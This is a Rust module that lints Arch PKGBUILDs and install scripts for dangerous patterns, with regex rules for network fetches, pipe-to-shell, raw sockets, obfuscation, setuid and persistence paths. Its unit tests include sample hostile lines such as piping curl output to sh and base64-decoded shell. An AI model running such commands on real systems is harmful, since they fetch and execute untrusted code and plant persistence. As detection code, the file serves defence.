//! Danger lint over PKGBUILDs and install scripts. Pattern rules with a
//! severity that depends on where the line sits: fetching in `prepare()` is
//! how Arch wants Go and Rust packages written, fetching in `package()` or an
//! install script is how the 2026 campaigns delivered payloads.

use std::sync::LazyLock;

use regex::Regex;
use serde::{Deserialize, Serialize};

use crate::{Risk, pkgbuild};

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct Finding {
    pub file: String,
    pub rule: String,
    pub severity: Risk,
    pub line: usize,
    /// Enclosing PKGBUILD function, if any.
    pub function: Option<String>,
    pub excerpt: String,
    pub note: Option<String>,
}

impl Finding {
    /// Identity used to match findings across commits.
    pub fn rule_and_excerpt(&self) -> String {
        format!("{}:{}", self.rule, self.excerpt)
    }
}

#[derive(Clone, Copy)]
struct Ctx<'a> {
    function: Option<&'a str>,
    is_script: bool,
}

impl Ctx<'_> {
    /// Fetching is expected in prepare() (and pkgver() for VCS), suspicious
    /// everywhere else.
    fn fetch_severity(&self) -> Risk {
        match self.function {
            Some("prepare") | Some("pkgver") if !self.is_script => Risk::Medium,
            _ => Risk::High,
        }
    }

    /// Lines that install into $pkgdir are packaging, not system changes.
    fn system_write_severity(&self, line: &str, otherwise: Risk) -> Option<Risk> {
        if !self.is_script && (line.contains("$pkgdir") || line.contains("${pkgdir}")) {
            return None;
        }
        Some(otherwise)
    }
}

struct Rule {
    name: &'static str,
    re: Regex,
    severity: fn(&Ctx<'_>, &str) -> Option<Risk>,
}

macro_rules! rule {
    ($name:literal, $re:literal, $sev:expr) => {
        Rule {
            name: $name,
            re: Regex::new($re).expect($re),
            severity: $sev,
        }
    };
}

static RULES: LazyLock<Vec<Rule>> = LazyLock::new(|| vec![
    rule!("network_tool", r"(^|[\s;|&(`])(curl|wget|aria2c)\s", |c, _| Some(c.fetch_severity())),
    rule!("network_tool", r"(^|[\s;|&(`])git\s+(clone|fetch|pull|submodule\s+update)\b", |c, _| Some(c.fetch_severity())),
    rule!(
        "package_manager_fetch",
        r"(^|[\s;|&(`])((pip3?|pipx|uv)\s+(install|download)|npm\s+(install|i|ci|exec)|npx\s|yarn\s+(install|add)|pnpm\s+(install|add)|bun\s+(install|add)|go\s+(get|install|mod\s+download)|cargo\s+(install|fetch)|gem\s+install|composer\s+(install|require)|conda\s+install)\b",
        |c, _| Some(c.fetch_severity())
    ),
    rule!("eval", r"(^|[\s;|&(`])eval\s", |_, _| Some(Risk::High)),
    rule!(
        "obfuscation",
        r"base64\s+(-d|--decode|-D)\b|\bxxd\s+-r|\bopenssl\s+enc\s+.*-d\b|(\\x[0-9a-fA-F]{2}){6,}|(\\[0-7]{3}){6,}|\brev\s*\|\s*(ba)?sh\b",
        |_, _| Some(Risk::High)
    ),
    rule!("pipe_to_shell", r"\|\s*(sudo\s+)?(ba|z|da)?sh(\s|$)", |_, _| Some(Risk::High)),
    rule!("privilege", r"(^|[\s;|&(`])(sudo|doas|pkexec)\s|(^|[\s;|&(`])su\s+(-c|root|-\s)", |_, _| Some(Risk::High)),
    rule!(
        "url_shortener",
        r"https?://(www\.)?(bit\.ly|tinyurl\.com|t\.co|goo\.gl|is\.gd|cutt\.ly|rb\.gy|shorturl\.at|rebrand\.ly|tiny\.cc|ow\.ly|buff\.ly|v\.gd|t\.ly)/",
        |_, _| Some(Risk::High)
    ),
    rule!("ip_literal_url", r"[a-z]+://[0-9]{1,3}(\.[0-9]{1,3}){3}([:/]|$)", |_, line| {
        if line.contains("://127.") || line.contains("://0.0.0.0") {
            None
        } else {
            Some(Risk::High)
        }
    }),
    rule!("plain_http", r"\bhttp://", |_, line| {
        if line.contains("http://localhost") || line.contains("http://127.") || line.contains("http://[::1]") {
            None
        } else {
            Some(Risk::Medium)
        }
    }),
    rule!("raw_socket", r"/dev/(tcp|udp)/|(^|[\s;|&(`])(nc|ncat|netcat|socat|telnet)\s", |_, _| Some(Risk::High)),
    rule!("setuid", r"chmod\s+(-R\s+)?([0-7]?[2-7][0-7]{3}\b|[ugoa]*\+[rwxt]*s)|(^|[\s;|&(`])setcap\s", |c, l| {
        c.system_write_severity(l, Risk::High).or(Some(Risk::Medium))
    }),
    rule!(
        "persistence",
        r"\.bashrc|\.bash_profile|\.profile\b|\.zshrc|\.zshenv|authorized_keys|ld\.so\.preload|LD_PRELOAD|/etc/sudoers|sudoers\.d|/etc/cron|(^|[\s;|&(`])crontab\s|\.config/autostart|/etc/rc\.local|/etc/profile\.d",
        |c, l| c.system_write_severity(l, Risk::High)
    ),
    rule!("pacman_hook", r"/usr/share/libalpm/hooks|/etc/pacman\.d/hooks", |c, l| c.system_write_severity(l, Risk::Medium)),
    rule!(
        "systemd",
        r"(^|[\s;|&(`])systemctl\s+(enable|start|restart|daemon-reload|--user)|/etc/systemd/system/",
        |c, l| c.system_write_severity(l, Risk::Medium)
    ),
    rule!("polkit", r"polkit-1/(rules\.d|localauthority)|/etc/polkit", |c, l| c.system_write_severity(l, Risk::High)),
    rule!("inline_interpreter", r"(^|[\s;|&(`])(python[23]?|perl|node|ruby|php)\s+-[ceEr]\s", |_, l| {
        if l.contains("http") || l.contains("socket") || l.contains("urllib") || l.contains("requests") {
            Some(Risk::High)
        } else {
            Some(Risk::Medium)
        }
    }),
    rule!("background_process", r"(^|[\s;|&(`])(nohup|setsid|disown)\s", |_, _| Some(Risk::Medium)),
    rule!(
        "system_write",
        r"(>|>>)\s*/(etc|usr|var|opt|bin|sbin|lib|root|home)/|(^|[\s;|&(`])(install|cp|mv|ln|tee|rsync)\s[^#]*\s/(etc|usr|var|opt|bin|sbin|lib|root|home)/",
        |c, l| c.system_write_severity(l, if c.is_script { Risk::Medium } else { Risk::High })
    ),
    rule!("home_write", r"(>|>>|install|cp|mv|tee|mkdir)\s[^#]*(\$HOME|\$\{HOME\}|~/|/root/|/home/)", |c, l| {
        if l.contains("$srcdir") || l.contains("$pkgdir") || l.contains("${srcdir}") || l.contains("${pkgdir}") {
            None
        } else {
            c.system_write_severity(l, Risk::Medium)
        }
    }),
    rule!("hidden_path", r"(^|[\s=\x22'])/(tmp|var/tmp|dev/shm)/\.[A-Za-z0-9]", |_, _| Some(Risk::High)),
]);

fn unicode_controls(line: &str) -> Option<String> {
    for c in line.chars() {
        let suspicious = matches!(c,
            '\u{202A}'..='\u{202E}' | '\u{2066}'..='\u{2069}' | '\u{200B}'..='\u{200D}' | '\u{2060}' | '\u{FEFF}' | '\u{00AD}' | '\u{061C}' | '\u{180E}');
        if suspicious {
            return Some(format!("U+{:04X}", c as u32));
        }
    }
    None
}

/// Drop a trailing comment. Approximate: `#` preceded by whitespace or at
/// the start of the line, outside quotes.
fn strip_comment(line: &str) -> &str {
    let t = line.trim_start();
    if t.starts_with('#') {
        return "";
    }
    let mut quote: Option<char> = None;
    let mut prev = ' ';
    for (i, c) in line.char_indices() {
        match (quote, c) {
            (Some(q), x) if x == q => quote = None,
            (Some(_), _) => {}
            (None, '\'') | (None, '"') => quote = Some(c),
            (None, '#') if prev.is_whitespace() || prev == ';' => return &line[..i],
            _ => {}
        }
        prev = c;
    }
    line
}

fn excerpt(line: &str) -> String {
    let t = line.trim();
    if t.chars().count() > 160 {
        let cut: String = t.chars().take(157).collect();
        format!("{cut}...")
    } else {
        t.to_string()
    }
}

fn lint_lines(text: &str, file: &str, is_script: bool) -> Vec<Finding> {
    let spans = if is_script { Vec::new() } else { pkgbuild::spans(text) };
    let mut out = Vec::new();
    for (i, raw) in text.lines().enumerate() {
        let lineno = i + 1;
        let function = pkgbuild::function_at(&spans, lineno);
        let ctx = Ctx { function, is_script };
        if let Some(cp) = unicode_controls(raw) {
            out.push(Finding {
                file: file.to_string(),
                rule: "unicode_control".into(),
                severity: Risk::High,
                line: lineno,
                function: function.map(str::to_string),
                excerpt: format!("{cp} in: {}", excerpt(raw)),
                note: None,
            });
        }
        let line = strip_comment(raw);
        if line.trim().is_empty() {
            continue;
        }
        for r in RULES.iter() {
            if r.re.is_match(line)
                && let Some(sev) = (r.severity)(&ctx, line)
            {
                out.push(Finding {
                    file: file.to_string(),
                    rule: r.name.into(),
                    severity: sev,
                    line: lineno,
                    function: function.map(str::to_string),
                    excerpt: excerpt(line),
                    note: None,
                });
            }
        }
    }
    out
}

pub fn lint_pkgbuild(text: &str) -> Vec<Finding> {
    lint_lines(text, "PKGBUILD", false)
}

/// Install scripts and hooks run as root on the user's machine, so every
/// function in them is a system change.
pub fn lint_script(name: &str, text: &str) -> Vec<Finding> {
    lint_lines(text, name, true)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn rules(findings: &[Finding]) -> Vec<(&'static str, Risk)> {
        findings
            .iter()
            .map(|f| (RULES.iter().map(|r| r.name).chain(["unicode_control"]).find(|n| *n == f.rule).unwrap(), f.severity))
            .collect()
    }

    #[test]
    fn fetch_in_prepare_is_medium_elsewhere_high() {
        let pb = "prepare() {\n  cargo fetch --locked\n}\npackage() {\n  curl -s https://x/y | sh\n}\n";
        let f = lint_pkgbuild(pb);
        assert_eq!(
            rules(&f),
            [("package_manager_fetch", Risk::Medium), ("network_tool", Risk::High), ("pipe_to_shell", Risk::High)]
        );
        assert_eq!(f[1].function.as_deref(), Some("package"));
    }

    #[test]
    fn packaging_into_pkgdir_is_not_a_system_write() {
        let pb = "package() {\n  install -Dm644 x.hook \"$pkgdir/usr/share/libalpm/hooks/x.hook\"\n  install -Dm644 u.service \"$pkgdir/usr/lib/systemd/system/u.service\"\n}\n";
        assert!(lint_pkgbuild(pb).is_empty(), "{:?}", lint_pkgbuild(pb));
        let script = "post_install() {\n  install -Dm644 /tmp/x.hook /usr/share/libalpm/hooks/x.hook\n  systemctl enable evil.service\n}\n";
        let f = lint_script("foo.install", script);
        assert_eq!(rules(&f), [("pacman_hook", Risk::Medium), ("system_write", Risk::Medium), ("systemd", Risk::Medium)]);
    }

    #[test]
    fn comments_do_not_count() {
        let pb = "build() {\n  make # eval was here once\n  # curl https://x\n}\n";
        assert!(lint_pkgbuild(pb).is_empty());
    }

    #[test]
    fn obfuscation_and_controls() {
        let pb = "package() {\n  echo aGk= | base64 -d | sh\n  printf '\\x63\\x75\\x72\\x6c\\x20\\x68'\n}\n";
        let r = rules(&lint_pkgbuild(pb));
        assert!(r.contains(&("obfuscation", Risk::High)), "{r:?}");
        assert!(r.contains(&("pipe_to_shell", Risk::High)), "{r:?}");
        let bidi = "pkgver=1 \u{202E}# harmless\n";
        assert_eq!(rules(&lint_pkgbuild(bidi)), [("unicode_control", Risk::High)]);
    }

    #[test]
    fn plain_http_and_ip_literals() {
        let pb = "url=\"http://example.org\"\nsource=(\"https://10.0.0.5/x.tar.gz\" \"http://localhost:8000/y\")\n";
        let r = rules(&lint_pkgbuild(pb));
        assert_eq!(r, [("plain_http", Risk::Medium), ("ip_literal_url", Risk::High)]);
    }

    #[test]
    fn setuid_and_persistence() {
        let pb = "package() {\n  chmod 4755 \"$pkgdir/usr/bin/x\"\n  chmod u+s /usr/bin/y\n  echo x >> /root/.bashrc\n}\n";
        let r = rules(&lint_pkgbuild(pb));
        assert_eq!(
            r,
            [("setuid", Risk::Medium), ("setuid", Risk::High), ("persistence", Risk::High), ("system_write", Risk::High), ("home_write", Risk::Medium)]
        );
    }
}
